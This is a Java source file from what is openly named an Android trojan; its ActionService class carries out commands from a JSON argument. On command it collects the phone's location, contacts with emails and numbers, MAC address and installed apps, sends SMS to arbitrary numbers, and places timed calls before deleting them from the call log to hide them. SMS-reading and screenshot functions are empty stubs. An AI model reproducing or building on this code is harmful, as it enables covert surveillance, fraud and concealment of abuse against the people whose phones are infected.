package trojan.android.android_trojan.action;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Objects;

import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import trojan.android.android_trojan.R;
import trojan.android.android_trojan.activity.MainActivity;

import static android.R.attr.action;
import static android.R.attr.id;
import static android.R.attr.targetActivity;
import static android.app.PendingIntent.getActivity;
import static android.provider.Telephony.*;
import static android.provider.Telephony.Mms.Part.FILENAME;


public class ActionService extends Activity{

    private static final String TAG = "ActionService";
    private Context context;
    private String result = null;


    public ActionService(Context context){
        this.context = context;
    }

    public String action(String arg) {
        JSONObject argjson;
        try {
            argjson = new JSONObject(arg);
            getLocation(argjson);
            getContacts(argjson);
            getMacAddress(argjson);
            SendSMS(argjson);
            GetSMS(argjson);
            getInstalledApps(argjson);
            call(argjson);
            takeScreenshot(argjson);
        }catch (JSONException ex){
            Log.d(TAG, ex.getMessage());
            this.result = "Error JSON";
        }

        return result;
    }

    //Obtiene la localizacion
    private void getLocation(JSONObject argjson) {
        if (!argjson.has("location")){
            return;
        }

        //Obtiene localizacion manager
        LocationManager locManager = (LocationManager) this.context.getSystemService(context.LOCATION_SERVICE);

        //elige el mejor proveedor para la localizacion
        Location locationNetwork = locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        Location locationGPS = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        Location locationPassive = locManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);

        String[] result = new String[6];

        //trata de obtener la latitud y localizacion
        try {
            result[0] = "NETWORK Latitude " + String.valueOf(locationNetwork.getLatitude());
            result[1] = "NETWORK Longitude " + String.valueOf(locationNetwork.getLongitude());
            result[2] = "GPS Latitude " + String.valueOf(locationGPS.getLatitude());
            result[3] = "GPS Longitude " + String.valueOf(locationGPS.getLongitude());
            result[4] = "PASSIVE Latitude " + String.valueOf(locationPassive.getLatitude());
            result[5] = "PASSIVE Longitude " + String.valueOf(locationPassive.getLongitude());
        } catch (Exception ex) {//si falla regresa 0's
            Log.d(TAG, ex.getMessage());
            result[0] = "0";
            result[1] = "0";
            result[2] = "0";
            result[3] = "0";
            result[4] = "0";
            result[5] = "0";
        }

        this.result = new JSONArray(Arrays.asList(result)).toString();
    }


    //obtiene lista de contactos y correos electronicos
    private void getContacts(JSONObject argjson) {
        if (!argjson.has("contacts")){
            return;
        }

        ContentResolver cr = this.context.getContentResolver();
        //cursor
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        //Arreglo para almacenar los contactos
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                //obtiene el id de cada contacto
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                //obtiene el nombre
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                //si hay mas de 0 contactos
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    //identifica el id de cada contacto
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    //identifica el id de cada correo asociado a cada contacto
                    Cursor cur1 = cr.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    //recorre cada id
                    while (cur1.moveToNext()) {
                        //obtener emails
                        Log.e("Name :", name);
                        String email = cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        Log.e("Email", email);
                        if(email!=null){
                            //agrega al arreglo el nombre y email
                            contacts.add(new String[]{name,email});
                        }
                    }
                    //Recorre cada id
                    while (pCur.moveToNext()) {
                        //obtiene nombres y telefono
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        try {
                            //Agrega al arreglo los nombres y telefonos
                            contacts.add(new String[]{
                                    URLEncoder.encode(name, "UTF-8"),
                                    URLEncoder.encode(phoneNo, "UTF-8")});
                        } catch (UnsupportedEncodingException e) {
                            e.printStackTrace();
                        }
                    }
                    pCur.close();
                    cur1.close();
                }
            }
        }
        //Muestra el arreglo contacts
        this.result = new JSONArray(contacts).toString();
    }

    //get current Mac Address
    private void getMacAddress(JSONObject argjson) {
        if (!argjson.has("mac")){
            return;
        }

        WifiManager manager = (WifiManager) this.context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = manager.getConnectionInfo();
        this.result = info.getMacAddress();
    }

    //Envia SMS
    private void SendSMS(JSONObject argjson) throws JSONException {
        //si el comando es sendsms se hara lo siguiente
        if (!argjson.has("sendsms")){
            return;
        }

        String numTelephone;
        String message;
        //Se maneja como arreglo lo se que se pasa en el comando
        JSONArray array = argjson.getJSONArray("sendsms");
        //numero
        numTelephone = array.get(0).toString();
        //mensage
        message = array.get(1).toString();

        SmsManager sms = SmsManager.getDefault();
        //funcion que manda el mensaje
        sms.sendTextMessage(numTelephone, null, message, null, null);

        this.result = "message send";
    }

    //Obtiene SMS
    private BroadcastReceiver receiver=null;
    private void GetSMS(JSONObject argjson) throws JSONException {
        if (!argjson.has("getsms")) {
            return;
        }

    }

    //Aplicaciones instaladas
    private void getInstalledApps(JSONObject argjson) {
        if (!argjson.has("packages")){
            return;
        }

        boolean getSysPackages = true;
        //Arreglo que almacenara las aplicaciones
        ArrayList<String[]> packages = new ArrayList<String[]>();
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        //imprimira todoas las aplicaciones que se encuentre
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue;
            }
            //Se va agregando al arreglo la aplicacion
            try {
                packages.add(new String[]{
                        //nombre app --> URLEncoder.encode convierte a string formato MIME de la aplicacione
                        URLEncoder.encode(p.applicationInfo.loadLabel(context.getPackageManager()).toString(), "UTF-8"),
                        //nombre del paquete de la app
                        URLEncoder.encode(p.packageName, "UTF-8"),
                        //Version app
                        URLEncoder.encode(p.versionName, "UTF-8"),
                        URLEncoder.encode(String.valueOf(p.versionCode), "UTF-8")
                });
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }
        //imprime el arreglo
        this.result = new JSONArray(packages).toString();
    }

    //Funcion que realiza un llamada X milisegundos
    public void call(JSONObject argjson) throws JSONException {
        if (!argjson.has("call")){
            return;
        }

        String num;
        long time;

        JSONArray array = argjson.getJSONArray("call");
        num = array.get(0).toString();
        time = Long.valueOf(array.get(1).toString());
        Log.d(TAG, num + " " + time);

        if (time > 1000) {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + num));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            Log.d(TAG, "Start call");
            PhoneStateReceiver phoneStateReceiver = new PhoneStateReceiver();

            Tools.sleep(time);

            phoneStateReceiver.onReceive(context, intent);
            phoneStateReceiver.killCall(context);

            Log.d(TAG, "Stop call");

            Tools.sleep(1000);

            String strNumberOne[] = {num};
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
            if (cursor.moveToFirst()) {
                do {
                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                    context.getContentResolver().delete(
                            CallLog.Calls.CONTENT_URI,
                            CallLog.Calls._ID + "= ? ",
                            new String[]{String.valueOf(idOfRowToDelete)});
                } while (cursor.moveToNext());
            }
        }

        this.result = "call done";
    }

    //ScreenShot

    public void takeScreenshot(JSONObject argjson) throws JSONException {
        if (!argjson.has("screenshot")) {
            return;
        }
        //screen();

    }






}
